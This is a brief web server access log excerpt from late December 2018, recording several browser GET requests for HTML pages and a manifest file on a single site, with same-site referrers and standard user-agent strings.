103.192.227.202 - - [31/Dec/2018:22:30:37 +0800] "GET /pat/catalog.html HTTP/2.0" 200 0 "https://wyydsb.xin/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3655.0 Safari/537.36"
103.192.227.202 - - [31/Dec/2018:22:30:37 +0800] "GET /pat/entrance.html HTTP/2.0" 200 0 "https://wyydsb.xin/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3655.0 Safari/537.36"
103.192.227.202 - - [31/Dec/2018:22:30:37 +0800] "GET /pat/sort.html HTTP/2.0" 200 0 "https://wyydsb.xin/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3655.0 Safari/537.36"
103.192.227.202 - - [31/Dec/2018:22:30:37 +0800] "GET /tags/index.html HTTP/2.0" 200 0 "https://wyydsb.xin/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3655.0 Safari/537.36"
103.192.227.202 - - [31/Dec/2018:22:30:44 +0800] "GET /pat/1107.html HTTP/2.0" 200 38580 "https://wyydsb.xin/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3655.0 Safari/537.36"
218.247.220.164 - - [31/Dec/2018:22:31:29 +0800] "GET /manifest.json HTTP/2.0" 200 406 "https://wyydsb.xin/pat/catalog.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
